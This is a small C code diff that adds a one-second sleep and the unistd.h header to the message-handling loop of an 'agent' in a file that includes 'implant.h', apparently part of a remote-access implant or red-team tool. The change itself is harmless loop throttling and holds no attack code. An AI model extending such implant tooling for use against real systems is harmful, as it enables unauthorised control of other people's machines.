@@ -2,6 +2,7 @@
 #include <stdlib.h>
 #include <pthread.h>
 #include <string.h>
+#include <unistd.h>
 
 #include "queue.h"
 #include "implant.h"
@@ -89,7 +90,8 @@ void* agent_handle_message(void*){
 	
 	assembled_message.last_fragment_index = -1;
 	
-	for (;;){		
+	for (;;){
+		sleep(1);
 		if (!(message = dequeue(agent_receive_queue, &agent_receive_queue_lock))) continue;;
 		
 		fragment = message->fragment;
